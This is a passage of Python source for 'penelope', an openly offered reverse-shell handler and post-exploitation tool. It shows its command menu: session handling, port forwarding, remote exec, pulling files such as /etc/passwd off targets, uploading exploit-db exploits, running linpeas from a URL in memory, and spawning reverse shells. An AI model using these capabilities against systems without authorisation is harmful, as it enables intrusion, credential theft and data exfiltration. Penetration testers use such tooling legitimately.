#!/usr/bin/env python3

# Copyright © 2021 - 2025 @brightio <brightiocode@gmail.com>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

__program__= "penelope"
__version__ = "0.14.8"

import os
import io
import re
import sys
import tty
import ssl
import time
import shlex
import queue
import struct
import shutil
import socket
import signal
import base64
import termios
import tarfile
import logging
import zipfile
import inspect
import warnings
import platform
import threading
import subprocess
import socketserver

from math import ceil
from glob import glob
from json import dumps
from code import interact
from zlib import compress
from errno import EADDRINUSE, EADDRNOTAVAIL
from select import select
from pathlib import Path, PureWindowsPath
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
from datetime import datetime
from textwrap import indent, dedent
from binascii import Error as binascii_error
from functools import wraps
from collections import deque, defaultdict
from http.server import SimpleHTTPRequestHandler
from urllib.parse import unquote
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

################################## PYTHON MISSING BATTERIES ####################################
from string import ascii_letters
from random import choice, randint
rand = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
caller = lambda: inspect.stack()[2].function
bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))

def Open(item, terminal=False):
	if myOS != 'Darwin' and not DISPLAY:
		logger.error("No available $DISPLAY")
		return False

	if not terminal:
		program = 'xdg-open' if myOS != 'Darwin' else 'open'
		args = [item]
	else:
		if not TERMINAL:
			logger.error("No available terminal emulator")
			return False

		if myOS != 'Darwin':
			program = TERMINAL
			_switch = '-e'
			if program in ('gnome-terminal', 'mate-terminal'):
				_switch = '--'
			elif program == 'terminator':
				_switch = '-x'
			elif program == 'xfce4-terminal':
				_switch = '--command='
			args = [_switch, *shlex.split(item)]
		else:
			program = 'osascript'
			args = ['-e', f'tell app "Terminal" to do script "{item}"']

	if not shutil.which(program):
		logger.error(f"Cannot open window: '{program}' binary does not exist")
		return False

	process = subprocess.Popen(
		(program, *args),
		stdin=subprocess.DEVNULL,
		stdout=subprocess.DEVNULL,
		stderr=subprocess.PIPE
	)
	r, _, _ = select([process.stderr], [], [], .01)
	if process.stderr in r:
		error = os.read(process.stderr.fileno(), 1024)
		if error:
			logger.error(error.decode())
			return False
	return True


class Interfaces:

	def __str__(self):
		table = Table(joinchar=' : ')
		table.header = [paint('Interface').MAGENTA, paint('IP Address').MAGENTA]
		for name, ip in self.list.items():
			table += [paint(name).cyan, paint(ip).yellow]
		return str(table)

	def oneLine(self):
		return '(' + str(self).replace('\n', '|') + ')'

	def translate(self, interface_name):
		if interface_name in self.list:
			return self.list[interface_name]
		elif interface_name in ('any', 'all'):
			return '0.0.0.0'
		else:
			return interface_name

	@staticmethod
	def ipa(busybox=False):
		interfaces = []
		current_interface = None
		params = ['ip', 'addr']
		if busybox:
			params.insert(0, 'busybox')
		for line in subprocess.check_output(params).decode().splitlines():
			interface = re.search(r"^\d+: (.+?):", line)
			if interface:
				current_interface = interface[1]
				continue
			if current_interface:
				ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
				if ip:
					interfaces.append((current_interface, ip[1]))
					current_interface = None # TODO support multiple IPs in one interface
		return interfaces

	@staticmethod
	def ifconfig():
		output = subprocess.check_output(['ifconfig']).decode()
		return re.findall(r'^(\w+).*?\n\s+inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)

	@property
	def list(self):
		if shutil.which("ip"):
			interfaces = self.ipa()

		elif shutil.which("ifconfig"):
			interfaces = self.ifconfig()

		elif shutil.which("busybox"):
			interfaces = self.ipa(busybox=True)
		else:
			logger.error("'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)")
			return dict()

		return {i[0]:i[1] for i in interfaces}

	@property
	def list_all(self):
		return [item for item in list(self.list.keys()) + list(self.list.values())]


class Table:

	def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
		self.list_of_lists = list_of_lists

		self.joinchar = joinchar

		if type(fillchar) is str:
			self.fillchar = [fillchar]
		elif type(fillchar) is list:
			self.fillchar = fillchar
#		self.fillchar[0] = self.fillchar[0][0]

		self.data = []
		self.max_row_len = 0
		self.col_max_lens = []
		if header: self.header = header
		for row in self.list_of_lists:
			self += row

	@property
	def header(self):
		...

	@header.setter
	def header(self, header):
		self.add_row(header, header=True)

	def __str__(self):
		self.fill()
		return "\n".join([self.joinchar.join(row) for row in self.data])

	def __len__(self):
		return len(self.data)

	def add_row(self, row, header=False):
		row_len = len(row)
		if row_len > self.max_row_len:
			self.max_row_len = row_len

		cur_col_len = len(self.col_max_lens)
		for _ in range(row_len - cur_col_len):
			self.col_max_lens.append(0)

		for _ in range(cur_col_len - row_len):
			row.append("")

		new_row = []
		for index, element in enumerate(row):
			if not isinstance(element, (str, paint)):
				element = str(element)
			elem_length = len(element)
			new_row.append(element)
			if elem_length > self.col_max_lens[index]:
				self.col_max_lens[index] = elem_length

		if header:
			self.data.insert(0, new_row)
		else:
			self.data.append(new_row)

	def __iadd__(self, row):
		self.add_row(row)
		return self

	def fill(self):
		for row in self.data:
			for index, element in enumerate(row):
				fillchar = ' '
				if index in [*self.fillchar][1:]:
					fillchar = self.fillchar[0]
				row[index] = element + fillchar * (self.col_max_lens[index] - len(element))


class Size:
	units = ("", "K", "M", "G", "T", "P", "E", "Z", "Y")
	def __init__(self, _bytes):
		self.bytes = _bytes

	def __str__(self):
		index = 0
		new_size = self.bytes
		while new_size >= 1024 and index < len(__class__.units) - 1:
			new_size /= 1024
			index += 1
		return f"{new_size:.1f} {__class__.units[index]}Bytes"

	@classmethod
	def from_str(cls, string):
		if string.isnumeric():
			_bytes = int(string)
		else:
			try:
				num, unit = int(string[:-1]), string[-1]
				_bytes = num * 1024 ** __class__.units.index(unit)
			except:
				logger.error("Invalid size specified")
				return # TEMP
		return cls(_bytes)


from datetime import timedelta
from threading import Thread, RLock, current_thread
class PBar:
	pbars = []

	def __init__(self, end, caption="", barlen=None, queue=None, metric=None):
		self.end = end
		if type(self.end) is not int: self.end = len(self.end)
		self.active = True if self.end > 0 else False
		self.pos = 0
		self.percent = 0
		self.caption = caption
		self.bar = '#'
		self.barlen = barlen
		self.percent_prev = -1
		self.queue = queue
		self.metric = metric
		self.check_interval = 1
		if self.queue: self.trace_thread = Thread(target=self.trace); self.trace_thread.start(); __class__.render_lock = RLock()
		if self.metric: Thread(target=self.watch_speed, daemon=True).start()
		else: self.metric = lambda x: f"{x:,}"
		__class__.pbars.append(self)
		print("\x1b[?25l", end='', flush=True)
		self.render()

	def __bool__(self):
		return self.active

	def __enter__(self):
		return self

	def __exit__(self, exc_type, exc_value, traceback):
		self.terminate()

	def trace(self):
		while True:
			data = self.queue.get()
			self.queue.task_done()
			if isinstance(data, int): self.update(data)
			elif data is None: break
			else: self.print(data)

	def watch_speed(self):
		self.pos_prev = 0
		self.elapsed = 0
		while self:
			time.sleep(self.check_interval)
			self.elapsed += self.check_interval
			self.speed = self.pos - self.pos_prev
			self.pos_prev = self.pos
			self.speed_avg = self.pos / self.elapsed
			if self.speed_avg: self.eta = int(self.end / self.speed_avg) - self.elapsed
			if self: self.render()

	def update(self, step=1):
		if not self: return False
		self.pos += step
		if self.pos >= self.end: self.pos = self.end
		self.percent = int(self.pos * 100 / self.end)
		if self.pos >= self.end: self.terminate()
		if self.percent > self.percent_prev: self.render()

	def render_one(self):
		self.percent_prev = self.percent
		left = f"{self.caption}["
		elapsed = "" if not hasattr(self, 'elapsed') else f" | Elapsed {timedelta(seconds=self.elapsed)}"
		speed = "" if not hasattr(self, 'speed') else f" | {self.metric(self.speed)}/s"
		eta = "" if not hasattr(self, 'eta') else f" | ETA {timedelta(seconds=self.eta)}"
		right = f"] {str(self.percent).rjust(3)}% ({self.metric(self.pos)}/{self.metric(self.end)}){speed}{elapsed}{eta}"
		bar_space = self.barlen or os.get_terminal_size().columns - len(left) - len(right)
		bars = int(self.percent * bar_space / 100) * self.bar
		print(f'\x1b[2K{left}{bars.ljust(bar_space, ".")}{right}\n', end='', flush=True)

	def render(self):
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		for pbar in __class__.pbars: pbar.render_one()
		print(f"\x1b[{len(__class__.pbars)}A", end='', flush=True)
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()

	def print(self, data):
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		print(f"\x1b[2K{data}", flush=True)
		self.render()
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()

	def terminate(self):
		if self.queue and current_thread() != self.trace_thread: self.queue.join(); self.queue.put(None)
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		if not self: return
		self.active = False
		if hasattr(self, 'eta'): del self.eta
		if not any(__class__.pbars):
			self.render()
			print("\x1b[?25h" + '\n' * len(__class__.pbars), end='', flush=True)
			__class__.pbars.clear()
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()


class paint:
	_codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'orange':136, 'white':231, 'grey':244}
	_escape = lambda codes: f"\001\x1b[{codes}m\002"

	def __init__(self, text=None, colors=None):
		self.text = str(text) if text is not None else None
		self.colors = colors or []

	def __str__(self):
		if self.colors:
			content = self.text + __class__._escape(__class__._codes['RESET']) if self.text is not None else ''
			return __class__._escape(';'.join(self.colors)) + content
		return self.text

	def __len__(self):
		return len(self.text)

	def __add__(self, text):
		return str(self) + str(text)

	def __mul__(self, num):
		return __class__(self.text * num, self.colors)

	def __getattr__(self, attr):
		self.colors.clear()
		for color in attr.split('_'):
			if color in __class__._codes:
				self.colors.append(str(__class__._codes[color]))
			else:
				prefix = "3" if color in __class__._colors else "4"
				self.colors.append(prefix + "8;5;" + str(__class__._colors[color.lower()]))
		return self


class CustomFormatter(logging.Formatter):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.templates = {
			logging.CRITICAL: {'color':"RED",     'prefix':"[!!!]"},
			logging.ERROR:    {'color':"red",     'prefix':"[-]"},
			logging.WARNING:  {'color':"yellow",  'prefix':"[!]"},
			logging.TRACE:    {'color':"cyan",    'prefix':"[•]"},
			logging.INFO:     {'color':"green",   'prefix':"[+]"},
			logging.DEBUG:    {'color':"magenta", 'prefix':"[DEBUG]"}
		}

	def format(self, record):
		template = self.templates[record.levelno]

		thread = ""
		if record.levelno is logging.DEBUG or options.debug:
			thread = paint(" ") + paint(threading.current_thread().name).white_CYAN

		prefix = "\x1b[2K\r"
		suffix = "\r\n"

		if core.wait_input:
			suffix += bytes(core.output_line_buffer).decode() + readline.get_line_buffer()

		elif core.attached_session:
			suffix += bytes(core.output_line_buffer).decode()

		text = f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}"
		return f"{prefix}{getattr(paint(text), template['color'])}{suffix}"


class LineBuffer:
	def __init__(self, length):
		self.len = length
		self.lines = deque(maxlen=self.len)

	def __lshift__(self, data):
		if isinstance(data, str):
			data = data.encode()
		if self.lines and not self.lines[-1].endswith(b'\n'):
			current_partial = self.lines.pop()
		else:
			current_partial = b''
		self.lines.extend((current_partial + data).split(b'\n'))
		return self

	def __bytes__(self):
		return b'\n'.join(self.lines)

def stdout(data, record=True):
	os.write(sys.stdout.fileno(), data)
	if record:
		core.output_line_buffer << data

def ask(text):
	try:
		try:
			return input(f"{paint(f'[?] {text}').yellow}")

		except EOFError:
			print()
			return ask(text)

	except KeyboardInterrupt:
		print("^C")
		return ' '

def my_input(text="", histfile=None, histlen=None, completer=lambda text, state: None, completer_delims=None):
	if threading.current_thread().name == 'MainThread':
		signal.signal(signal.SIGINT, keyboard_interrupt)

	if readline:
		readline.set_completer(completer)
		readline.set_completer_delims(completer_delims or default_readline_delims)
		readline.clear_history()
		if histfile:
			try:
				readline.read_history_file(histfile)
			except Exception as e:
				cmdlogger.debug(f"Error loading history file: {e}")
		#readline.set_auto_history(True)

	core.output_line_buffer << b"\n" + text.encode()
	core.wait_input = True

	try:
		response = original_input(text)

		if readline:
			#readline.set_completer(None)
			#readline.set_completer_delims(default_readline_delims)
			if histfile:
				try:
					readline.set_history_length(options.histlength)
					#readline.add_history(response)
					readline.write_history_file(histfile)
				except Exception as e:
					cmdlogger.debug(f"Error writing to history file: {e}")
			#readline.set_auto_history(False)
		return response
	finally:
		core.wait_input = False

class BetterCMD:
	def __init__(self, prompt=None, banner=None, histfile=None, histlen=None):
		self.prompt = prompt
		self.banner = banner
		self.histfile = histfile
		self.histlen = histlen
		self.cmdqueue = []
		self.lastcmd = ''
		self.active = threading.Event()
		self.stop = False

	def show(self):
		print()
		self.active.set()

	def start(self):
		self.preloop()
		if self.banner:
			print(self.banner)

		stop = None
		while not self.stop:
			try:
				try:
					self.active.wait()
					if self.cmdqueue:
						line = self.cmdqueue.pop(0)
					else:
						line = input(self.prompt, self.histfile, self.histlen, self.complete, " \t\n\"'><=;|&(:")

					signal.signal(signal.SIGINT, lambda num, stack: self.interrupt())
					line = self.precmd(line)
					stop = self.onecmd(line)
					stop = self.postcmd(stop, line)
					if stop:
						self.active.clear()
				except EOFError:
					stop = self.onecmd('EOF')
				except Exception:
					custom_excepthook(*sys.exc_info())
			except KeyboardInterrupt:
				print("^C")
				self.interrupt()
		self.postloop()

	def onecmd(self, line):
		cmd, arg, line = self.parseline(line)
		if cmd:
			try:
				func = getattr(self, 'do_' + cmd)
				self.lastcmd = line
			except AttributeError:
				return self.default(line)
			return func(arg)

	def default(self, line):
		cmdlogger.error("Invalid command")

	def interrupt(self):
		pass

	def parseline(self, line):
		line = line.lstrip()
		if not line:
			return None, None, line
		elif line[0] == '!':
			index = line[1:].strip()
			hist_len = readline.get_current_history_length()

			if not index.isnumeric() or not (0 < int(index) < hist_len):
				cmdlogger.error("Invalid command number")
				readline.remove_history_item(hist_len - 1)
				return None, None, line

			line = readline.get_history_item(int(index))
			readline.replace_history_item(hist_len - 1, line)
			return self.parseline(line)

		else:
			parts = line.split(' ', 1)
			if len(parts) == 1:
				return parts[0], None, line
			elif len(parts) == 2:
				return parts[0], parts[1], line

	def precmd(self, line):
		return line

	def postcmd(self, stop, line):
		return stop

	def preloop(self):
		pass

	def postloop(self):
		pass

	def do_reset(self, line):
		"""

		Reset the local terminal
		"""
		if shutil.which("reset"):
			os.system("reset")
		else:
			cmdlogger.error("'reset' command doesn't exist on the system")

	def do_exit(self, line):
		"""

		Exit cmd
		"""
		self.stop = True
		self.active.clear()

	def do_history(self, line):
		"""

		Show Main Menu history
		"""
		if readline:
			hist_len = readline.get_current_history_length()
			max_digits = len(str(hist_len))
			for i in range(1, hist_len + 1):
				print(f"  {i:>{max_digits}}  {readline.get_history_item(i)}")
		else:
			cmdlogger.error("Python is not compiled with readline support")

	def do_DEBUG(self, line):
		"""

		Open debug console
		"""
		import rlcompleter

		if readline:
			readline.clear_history()
			try:
				readline.read_history_file(options.debug_histfile)
			except Exception as e:
				cmdlogger.debug(f"Error loading history file: {e}")

		interact(banner=paint(
			"===> Entering debugging console...").CYAN, local=globals(),
			exitmsg=paint("<=== Leaving debugging console..."
		).CYAN)

		if readline:
			readline.set_history_length(options.histlength)
			try:
				readline.write_history_file(options.debug_histfile)
			except Exception as e:
				cmdlogger.debug(f"Error writing to history file: {e}")

	def completedefault(self, *ignored):
		return []

	def completenames(self, text, *ignored):
		dotext = 'do_' + text
		return [a[3:] for a in dir(self.__class__) if a.startswith(dotext)]

	def complete(self, text, state):
		if state == 0:
			origline = readline.get_line_buffer()
			line = origline.lstrip()
			stripped = len(origline) - len(line)
			begidx = readline.get_begidx() - stripped
			endidx = readline.get_endidx() - stripped
			if begidx > 0:
				cmd, args, foo = self.parseline(line)
				if cmd == '':
					compfunc = self.completedefault
				else:
					try:
						compfunc = getattr(self, 'complete_' + cmd)
					except AttributeError:
						compfunc = self.completedefault
			else:
				compfunc = self.completenames
			self.completion_matches = compfunc(text, line, begidx, endidx)
		try:
			return self.completion_matches[state]
		except IndexError:
			return None
	@staticmethod
	def file_completer(text):
		matches = glob(text + '*')
		matches = [m + '/' if os.path.isdir(m) else m for m in matches]
		#matches = [f"'{m}'" if ' ' in m else m for m in matches]
		return matches

##########################################################################################################

class MainMenu(BetterCMD):

	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.set_id(None)
		self.commands = {
			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
			"Shell Management"  :['listeners', 'payloads', 'connect', 'Interfaces'],
			"Miscellaneous"     :['help', 'modules', 'history', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
		}

	@property
	def raw_commands(self):
		return [command.split('|')[0] for command in sum(self.commands.values(), [])]

	@property
	def active_sessions(self):
		active_sessions = len(core.sessions)
		if active_sessions:
			s = "s" if active_sessions > 1 else ""
			return paint(f" ({active_sessions} active session{s})").red + paint().yellow
		return ""

	@staticmethod
	def get_core_id_completion(text, *extra, attr='sessions'):
		options = list(map(str, getattr(core, attr)))
		options.extend(extra)
		return [option for option in options if option.startswith(text)]

	def set_id(self, ID):
		self.sid = ID
		session_part = (
				f"{paint('─(').cyan_DIM}{paint('Session').green} "
				f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
		) if self.sid else ''
		self.prompt = (
				f"{paint(f'(').cyan_DIM}{paint('Penelope').magenta}{paint(f')').cyan_DIM}"
				f"{session_part}{paint('>').cyan_DIM} "
		)

	def session_operation(current=False, extra=[]):
		def inner(func):
			@wraps(func)
			def newfunc(self, ID):
				if current:
					if not self.sid:
						if core.sessions:
							cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
						else:
							cmdlogger.warning("No available sessions to perform this action")
						return False
				else:
					if ID:
						if ID.isnumeric() and int(ID) in core.sessions:
							ID = int(ID)
						elif ID not in extra:
							cmdlogger.warning("Invalid session ID")
							return False
					else:
						if self.sid:
							ID = self.sid
						else:
							cmdlogger.warning("No session selected")
							return None
				return func(self, ID)
			return newfunc
		return inner

	def interrupt(self):
		if core.attached_session and not core.attached_session.type == 'Readline':
			core.attached_session.detach()
		else:
			if menu.sid and not core.sessions[menu.sid].agent: # TEMP
				core.sessions[menu.sid].control_session.subchannel.control << 'stop'

	def show_help(self, command):
		help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
		parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
		modified_parts = []
		for part in parts[2:]:
			part = help_prompt.sub('', part)
			modified_parts.append(part)
		print(indent("\n".join(modified_parts), '    '))

		if command == 'run':
			self.show_modules()

	def do_help(self, command):
		"""
		[command | -a]
		Show Main Menu help or help about a specific command

		Examples:

			help		Show all commands at a glance
			help interact	Show extensive information about a command
			help -a		Show extensive information for all commands
		"""
		if command:
			if command == "-a":
				for section in self.commands:
					print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
					for command in self.commands[section]:
						self.show_help(command)
			else:
				if command in self.raw_commands:
					self.show_help(command)
				else:
					cmdlogger.warning(
						f"No such command: '{command}'. "
						"Issue 'help' for all available commands"
					)
		else:
			for section in self.commands:
				print(f'\n{paint(section).yellow}\n{paint("─" * len(section)).cyan}')
				table = Table(joinchar=' · ')
				for command in self.commands[section]:
					parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
				print(table)
			print()

	@session_operation(extra=['none'])
	def do_use(self, ID):
		"""
		[SessionID|none]
		Select a session

		Examples:

			use 1		Select the SessionID 1
			use none	Unselect any selected session
		"""
		if ID == 'none':
			self.set_id(None)
		else:
			self.set_id(ID)

	def do_sessions(self, line):
		"""
		[SessionID]
		Show active sessions or interact with the SessionID

		Examples:

			sessions		Show active sessions
			sessions 1		Interact with SessionID 1
		"""
		if line:
			if self.do_interact(line):
				return True
		else:
			if core.sessions:
				for host, sessions in core.hosts.items():
					if not sessions:
						continue
					print('\n➤  ' + sessions[0].name_colored)
					table = Table(joinchar=' | ')
					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source')]
					for session in sessions:
						if self.sid == session.id:
							ID = paint('[' + str(session.id) + ']').red
						elif session.new:
							if session.host_needs_control_session and session.control_session is session:
								ID = paint(' ' + str(session.id)).cyan
							else:
								ID = paint('<' + str(session.id) + '>').yellow_BLINK
						else:
							ID = paint(' ' + str(session.id)).yellow
						source = session.listener or f'Connect({session._host}:{session.port})'
						table += [
							ID,
							paint(session.type).CYAN if session.type == 'PTY' else session.type,
							session.user or 'N/A',
							source
						]
					print("\n", indent(str(table), "    "), "\n", sep="")
			else:
				print()
				cmdlogger.warning("No sessions yet 😟")
				print()

	@session_operation()
	def do_interact(self, ID):
		"""
		[SessionID]
		Interact with a session

		Examples:

			interact	Interact with current session
			interact 1	Interact with SessionID 1
		"""
		return core.sessions[ID].attach()

	@session_operation(extra=['*'])
	def do_kill(self, ID):
		"""
		[SessionID|*]
		Kill a session

		Examples:

			kill		Kill the current session
			kill 1		Kill SessionID 1
			kill *		Kill all sessions
		"""

		if ID == '*':
			if not core.sessions:
				cmdlogger.warning("No sessions to kill")
				return False
			else:
				if ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower() == 'y':
					if options.maintain > 1:
						options.maintain = 1
						self.onecmd("maintain")
					for session in reversed(list(core.sessions.copy().values())):
						session.kill()
		else:
			core.sessions[ID].kill()

		if options.single_session and len(core.sessions) == 1:
			core.stop()
			logger.info("Penelope exited due to Single Session mode")
			return True

	@session_operation(current=True)
	def do_portfwd(self, line):
		"""
		host:port(<-|->)host:port
		Local and Remote port forwarding

		Examples:

			-> 192.168.0.1:80		Forward 127.0.0.1:80 to 192.168.0.1:80
			0.0.0.0:8080 -> 192.168.0.1:80	Forward 0.0.0.0:8080 to 192.168.0.1:80
		"""
		if not line:
			cmdlogger.warning("No parameters...")
			return False

		match = re.search(r"((?:.*)?)(<-|->)((?:.*)?)", line)
		if match:
			group1 = match.group(1)
			arrow = match.group(2)
			group2 = match.group(3)
		else:
			cmdlogger.warning("Invalid syntax")
			return False

		if arrow == '->':
			_type = 'L'
			lhost = "127.0.0.1"

			if group2:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group2)
				if match:
					rhost = match.group(1)
					rport = match.group(2)
					lport = rport
				if not rport:
					cmdlogger.warning("At least remote port is required")
					return False
			else:
				cmdlogger.warning("At least remote port is required")
				return False

			if group1:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group1)
				if match:
					lhost = match.group(1)
					lport = match.group(2)
				else:
					cmdlogger.warning("Invalid syntax")
					return False

		elif arrow == '<-':
			_type = 'R'

			if group2:
				rhost, rport = group2.split(':')

			if group1:
				lhost, lport = group1.split(':')
			else:
				cmdlogger.warning("At least local port is required")
				return False

		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))

	@session_operation(current=True)
	def do_download(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target

		Examples:

			download /etc			Download a remote directory
			download /etc/passwd		Download a remote file
			download /etc/cron*		Download multiple remote files and directories using glob
			download /etc/issue /var/spool	Download multiple remote files and directories at once
		"""
		if remote_items:
			core.sessions[self.sid].download(remote_items)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_open(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target and open them locally

		Examples:

			open /etc			Open locally a remote directory
			open /root/secrets.ods		Open locally a remote file
			open /etc/cron*			Open locally multiple remote files and directories using glob
			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
		"""
		if remote_items:
			items = core.sessions[self.sid].download(remote_items)

			if len(items) > options.max_open_files:
				cmdlogger.warning(
					f"More than {options.max_open_files} items selected"
					" for opening. The open list is truncated to "
					f"{options.max_open_files}."
				)
				items = items[:options.max_open_files]

			for item in items:
				Open(item)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_upload(self, local_items):
		"""
		<glob|URL>...
		Upload files / folders / HTTP(S)/FTP(S) URLs to the target
		HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
		when the target has no Internet access

		Examples:

			upload /tools					  Upload a directory
			upload /tools/mysuperdupertool.sh		  Upload a file
			upload /tools/privesc* /tools2/*.sh		  Upload multiple files and directories using glob
			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
		"""
		if local_items:
			core.sessions[self.sid].upload(local_items, randomize_fname=True)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_script(self, local_item):
		"""
		<local_script|URL>
		In-memory local or URL script execution & real time downloaded output

		Examples:
			script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
		"""
		if local_item:
			core.sessions[self.sid].script(local_item)
		else:
			cmdlogger.warning("No script to execute")

	@staticmethod
	def show_modules():
		categories = defaultdict(list)
		for module in modules().values():
			categories[module.category].append(module)

		print()
		for category in categories:
			print("  " + str(paint(category).BLUE))
			table = Table(joinchar=' │ ')
			for module in categories[category]:
				description = module.run.__doc__ or ""
				if description:
					description = module.run.__doc__.strip().splitlines()[0]
				table += [paint(module.__name__).red, description]
			print(indent(str(table), '  '), "\n", sep="")

	@session_operation(current=True)
	def do_run(self, line):
		"""
		[module name]
		Run a module. Run 'help run' to view the available modules"""
		try:
			parts = line.split(" ", 1)
			module_name = parts[0]
		except:
			module_name = None
			print()
			cmdlogger.warning(paint("Select a module").YELLOW_white)

		if module_name:
			module = modules().get(module_name)
			if module:
				args = parts[1] if len(parts) == 2 else ''
				module.run(core.sessions[self.sid], args)
			else:
				cmdlogger.warning(f"Module '{module_name}' does not exist")
		else:
			self.show_modules()

	@session_operation(current=True)
	def do_spawn(self, line):
		"""
		[Port] [Host]
		Spawn a new session.

		Examples:

			spawn			Spawn a new session. If the current is bind then in will create a
						bind shell. If the current is reverse, it will spawn a reverse one

			spawn 5555		Spawn a reverse shell on 5555 port. This can be used to get shell
						on another tab. On the other tab run: ./penelope.py 5555

			spawn 3333 10.10.10.10	Spawn a reverse shell on the port 3333 of the 10.10.10.10 host
		"""
		host, port = None, None

		if line:
			args = line.split(" ")
			try:
				port = int(args[0])
			except ValueError:
				cmdlogger.error("Port number should be numeric")
				return False
			arg_num = len(args)
			if arg_num == 2:
				host = args[1]
			elif arg_num > 2:
				print()
				cmdlogger.error("Invalid PORT - HOST combination")
				self.onecmd("help spawn")
				return False

		core.sessions[self.sid].spawn(port, host)

	def do_maintain(self, line):
		"""
		[NUM]
		Maintain NUM active shells for each target

		Examples:

			maintain 5		Maintain 5 active shells
			maintain 1		Disable maintain functionality
		"""
		if line:
			if line.isnumeric():
				num = int(line)
				options.maintain = num
				refreshed = False
				for host in core.hosts.values():
					if len(host) < num:
						refreshed = True
						host[0].maintain()
				if not refreshed:
					self.onecmd("maintain")
			else:
				cmdlogger.error("Invalid number")
		else:
			status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
			cmdlogger.info(f"Maintain value set to {paint(options.maintain).yellow} {status}")

	@session_operation(current=True)
	def do_upgrade(self, ID):
		"""

		Upgrade the current session's shell to PTY
		Note: By default this is automatically run on the new sessions. Disable it with -U
		"""
		core.sessions[self.sid].upgrade()

	def do_dir(self, ID):
		"""
		[SessionID]
		Open the session's local folder. If no session specified, open the base folder
		"""
		folder = core.sessions[self.sid].directory if self.sid else options.basedir
		Open(folder)
		print(folder)

	@session_operation(current=True)
	def do_exec(self, cmdline):
		"""
		<remote command>
		Execute a remote command

		Examples:
			exec cat /etc/passwd
		"""
		if cmdline:
			if core.sessions[self.sid].agent:
				core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					stdout_dst=sys.stdout.buffer,
					stderr_dst=sys.stderr.buffer
				)
			else:
				output = core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					value=True
				)
				print(output)
		else:
			cmdlogger.warning("No command to execute")

	'''@session_operation(current=True) # TODO
	def do_tasks(self, line):
		"""

		Show assigned tasks
		"""
		table = Table(joinchar=' | ')
		table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']

		for sessionid in core.sessions:
			tasks = core.sessions[sessionid].tasks
			for taskid in tasks:
				for stream in tasks[taskid]['streams'].values():
					if stream.closed:
						status = paint('Completed!').GREEN
						break
				else:
					status = paint('Active...').YELLOW

				table += [
					paint(sessionid).red,
					paint(taskid).cyan,
					paint(tasks[taskid]['pid']).blue,
					paint(tasks[taskid]['command']).yellow,
					paint(tasks[taskid]['streams']['1'].name).green,
					status
				]

		if len(table) > 1:
			print(table)
		else:
			logger.warning("No assigned tasks")'''

	def do_listeners(self, line):
		"""
		[<add|stop>[-i <iface>][-p <port>]]
